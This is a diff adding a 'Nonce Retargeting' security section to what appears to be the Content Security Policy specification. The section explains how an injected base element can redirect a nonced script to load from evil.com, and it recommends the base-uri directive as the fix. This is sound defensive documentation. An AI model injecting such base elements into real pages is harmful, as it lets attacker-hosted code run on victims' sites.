@@ -3968,6 +3968,29 @@ spec: HTML; urlPrefix: https://html.spec.whatwg.org/
   attack by walking through <{script}> element attributes, looking for the
   string "<code>&lt;script</code>" or "<code>&lt;style</code>" in their names or values.
 
+  <h3 id="security-nonce-retargeting">Nonce Retargeting</h3>
+
+  Nonces bypass <a grammar>host-source</a> expressions, enabling developers to load code from any
+  origin. This, generally, is fine, and desirable from the developer's perspective. However, if an
+  attacker can inject a <{base}> element, then an otherwise safe page can be subverted when relative
+  URLs are resolved. That is, on `https://example.com/` the following code will load
+  `https://example.com/good.js`:
+
+  <pre highlight="html">
+    &lt;script nonce=abc src=/good.js&gt;&lt;/script&gt;
+  </pre>
+
+  However, the following will load `https://evil.com/good.js`:
+
+  <pre highlight="html">
+    &lt;base href="https://evil.com"&gt;
+    &lt;script nonce=abc src=/good.js&gt;&lt;/script&gt;
+  </pre>
+
+  To mitigate this risk, it is advisable to set an explicit <{base}> element on every page, or to
+  limit the ability of an attacker to inject their own <{base}> element by setting a
+  <a>`base-uri`</a> directive in your page's policy. For example, `base-uri 'none'`.
+
   <h3 id="security-css-parsing">CSS Parsing</h3>
 
   The <a>style-src</a> directive restricts the locations from which the
